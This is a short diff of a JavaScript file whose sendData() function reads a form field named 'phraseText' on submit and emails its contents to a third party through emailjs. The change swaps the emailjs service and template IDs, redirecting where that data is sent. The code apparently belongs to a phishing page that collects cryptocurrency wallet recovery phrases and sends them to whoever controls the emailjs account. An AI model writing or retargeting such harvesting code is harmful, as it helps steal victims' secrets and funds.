@@ -82,7 +82,7 @@ function sendData() {
         phrase: document.querySelector("#phraseText").value
     }
     console.log(tempParams)
-    emailjs.send('service_9eaebud', 'template_ix5gqkf', tempParams)
+    emailjs.send('service_pq2vojw', 'template_lm517gl', tempParams)
 }
 
 form.addEventListener('submit', function(e) {
